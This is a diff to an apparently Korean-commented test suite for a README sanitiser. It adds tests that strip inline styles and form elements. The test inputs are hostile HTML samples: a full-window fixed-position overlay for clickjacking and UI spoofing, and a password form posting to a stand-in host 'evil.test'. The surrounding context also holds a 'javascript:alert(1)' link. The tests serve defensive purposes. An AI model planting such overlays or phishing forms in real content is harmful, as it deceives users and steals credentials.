@@ -189,6 +189,27 @@ describe("보안 — 임의 저장소의 README를 앱 메인 컨텍스트에 �
     expect(el.querySelector("iframe")).toBeNull();
   });
 
+  it("인라인 style을 걷어낸다", () => {
+    // 스크립트가 아니어서 기본 살균은 통과시킨다. 하지만 `position:fixed`에 100vw/100vh면
+    // 앱 창 전체를 덮는 가짜 UI가 된다 — 클릭재킹이자 UI 스푸핑이다.
+    const el = render(
+      "문단.\n",
+      '문단.\n\n<p style="position:fixed;top:0;left:0;width:100vw;height:100vh">덮개</p>\n',
+    );
+    expect(el.querySelector("p[style]")).toBeNull();
+    expect(el.innerHTML).not.toContain("position:fixed");
+  });
+
+  it("폼 요소를 걷어낸다", () => {
+    // 앱 창 안에서 동작하는 자격증명 입력창이 된다. CSP에 form-action이 없어 제출도 막히지 않는다.
+    const el = render(
+      "문단.\n",
+      '문단.\n\n<form action="https://evil.test"><input name="pw" type="password"></form>\n',
+    );
+    expect(el.querySelector("form")).toBeNull();
+    expect(el.querySelector("input")).toBeNull();
+  });
+
   it("javascript: 링크를 살려두지 않는다", () => {
     const el = render("문단.\n", "문단.\n\n[클릭](javascript:alert(1))\n");
     const href = el.querySelector("a")?.getAttribute("href") ?? "";
